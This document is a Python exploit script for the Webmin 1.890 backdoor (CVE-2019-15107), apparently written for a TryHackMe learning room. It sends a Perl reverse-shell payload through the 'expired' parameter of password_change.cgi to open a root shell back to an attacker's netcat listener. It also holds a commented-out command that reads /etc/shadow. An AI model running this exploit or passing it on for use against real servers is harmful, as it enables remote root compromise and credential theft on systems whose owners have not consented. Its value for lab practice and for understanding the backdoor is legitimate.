'''
    This exploit targets [Webmin Version 1.890]
    It was written as a learning exercise for the TryHackMe-Room: "Source". https://tryhackme.com/room/source


    [INSTRUCTIONS]:
        Start a listener at the attacker pc.
        > nc -lvnp [ATTACKER_PORT]

        Start the exploit:
        > python3 exploit.py
'''

'''
    This is an exploit for CVE-2019-15107
        https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107
		https://github.com/webmin/webmin/issues/947        

    There was a backdoor hidden within the code.
    > $in{'expired'} eq '' || die $text{'password_expired'},qx/$in{'expired'}/;

    The command qx executes system commands. https://www.tutorialspoint.com/perl/perl_qx.htm

    > qx/$in{'expired'}/
    This will execute everything that is sent with the expired parameter, as the root user!
'''

import requests

# ---------------------------------------------
TARGET_HOST = "10.10.109.250"
TARGET_PORT = "10000"

# Start a netcat listener at the attacker pc.
# nc -lvnp [PORT]
ATTACKER_IP = ""
ATTACKER_PORT = "7331"

SKIP_SSL_CERTIFICATE_CHECK = True

#command = "echo '\nHACKED!!!'"
#command = "cat /etc/shadow"
command = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"" + ATTACKER_IP + ":" + ATTACKER_PORT + "\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
# ---------------------------------------------

peer = "https://" + TARGET_HOST + ":" + TARGET_PORT
url = "https://" + TARGET_HOST + ":" + TARGET_PORT + "/password_change.cgi"

headers = {
    "Referer": peer + "/session_login.cgi"
}

data = {
    "expired": command,    
}

response = requests.post(url, data=data, headers=headers, verify=not SKIP_SSL_CERTIFICATE_CHECK)

# Check if the target is exploitable
if response.headers['server'] == "MiniServ/1.890":
    print("\n" + response.text)
else:
    print("\nThis exploit is targeted at Webmin 1.890 not " + response.headers['server'])

